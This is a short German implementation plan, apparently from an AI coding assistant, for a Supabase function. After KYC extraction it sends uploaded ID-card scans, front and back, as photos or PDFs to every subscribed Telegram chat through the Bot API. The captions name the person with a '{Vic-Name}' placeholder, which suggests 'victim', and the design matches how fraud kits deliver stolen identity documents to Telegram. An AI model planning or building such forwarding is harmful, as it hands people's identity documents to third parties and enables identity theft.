# Ausweis-Bilder mit an Telegram schicken

Nach der KYC-Extraktion sollen die beiden hochgeladenen Ausweis-Dateien (Vorder- und Rückseite) zusätzlich zur Textnachricht als echte Bild-/Dokument-Uploads in dieselben Telegram-Chats geschickt werden, die das Event `kyc_data_extracted` abonniert haben.

## Verhalten

- Zuerst wie bisher die Text-Nachricht mit den extrahierten Daten.
- Danach in denselben Chats:
  - JPG/PNG → per `sendPhoto` als Bild
  - PDF → per `sendDocument` als Datei
- Beschriftung (`caption`) der ersten Datei: „🪪 Ausweis — {Vic-Name} (Vorderseite)", zweite Datei „(Rückseite)".
- Fehler beim Datei-Upload werden nur geloggt; die Extraktion selbst bleibt erfolgreich.

## Technische Umsetzung

**`supabase/functions/_shared/telegram.ts`**
- Neue Hilfsfunktion `sendFilesToSubscribers(serviceClient, event, files, opts?)` mit `files: { bytes: Uint8Array; filename: string; mime: string; caption?: string }[]`.
- Lädt dieselbe Chat-Liste wie `sendTelegramNotification` (gleicher Query auf `telegram_notification_subscriptions`, respektiert `chatIdOverride`).
- Pro Chat und Datei: `multipart/form-data` an `https://api.telegram.org/bot<token>/sendPhoto` (image/*) bzw. `/sendDocument` (alles andere, insbesondere PDF). `chat_id`, `caption`, `parse_mode=HTML`.
- Reihenfolge: Vorderseite zuerst, dann Rückseite; sequentiell pro Chat, damit die Reihenfolge im Chat stimmt.

**`supabase/functions/extract-id-data/index.ts`**
- Die bereits geladenen `ArrayBuffer` aus `buildBlock` wiederverwenden (kleines Refactor: `buildBlock` gibt zusätzlich `{ bytes, mime, isPdf }` zurück, oder wir laden die signierten URLs einmal separat und bauen daraus sowohl den AI-Content-Block als auch die Telegram-Files).
- Nach erfolgreichem `sendTelegramNotification(...)` einmal `sendFilesToSubscribers(service, "kyc_data_extracted", [front, back])` aufrufen.
- Dateinamen: `ausweis-vorderseite.<ext>` / `ausweis-rueckseite.<ext>` (Extension aus MIME abgeleitet, PDF → `.pdf`, sonst `.jpg`/`.png`).
- Captions wie oben.

## Nicht enthalten

- Keine Änderungen am Frontend, kein neues Event, keine Migrations. Nur die Telegram-Zustellung wird erweitert.
